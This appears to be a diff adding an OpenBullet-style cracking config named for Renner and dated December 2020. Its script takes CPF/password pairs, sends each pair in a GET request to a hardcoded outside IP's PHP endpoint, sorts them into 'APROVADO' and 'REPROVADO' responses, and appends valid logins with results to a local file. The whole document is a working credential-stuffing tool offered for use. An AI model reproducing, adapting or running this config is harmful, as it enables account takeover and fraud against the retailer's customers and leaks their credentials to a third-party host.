@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "RENNER DEZEMBRO SENHA(6) VERSAO 28-DEZ-2020",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-28T20:14:13.0054465-03:00",
+  "AdditionalInfo": "",
+  "Author": "WP",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#FUNCTION_CPF FUNCTION Trim "<USER>" -> CAP "US" 
+
+#FUNCTION_SENHA FUNCTION Trim "<PASS>" -> CAP "SE" 
+
+#USER_PASS KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<US>" EqualTo "" 
+    KEY "<SE>" EqualTo "" 
+
+#PROCEDIMENTO_NOVO REQUEST GET "http://52.170.119.169/renner/apiibkp2kia.php?linha=<USER>|<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#UPDATE_SYS KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "#APROVADO " 
+  KEYCHAIN Failure OR 
+    KEY "#REPROVADO" 
+    KEY "REPROVADO" 
+  KEYCHAIN Retry OR 
+    KEY "REPROVADO PROXY RUIM" 
+
+#DECRYPT_NOVO PARSE "<SOURCE>" LR "|;resultado; " ";finalresultado;\"}" -> VAR "RESUL" 
+
+#API_DEZEMBRO UTILITY File "(RENNER  28-12-2020).txt" AppendLines "<US>|<SE>|<RESUL>" -> CAP "RES" 
+
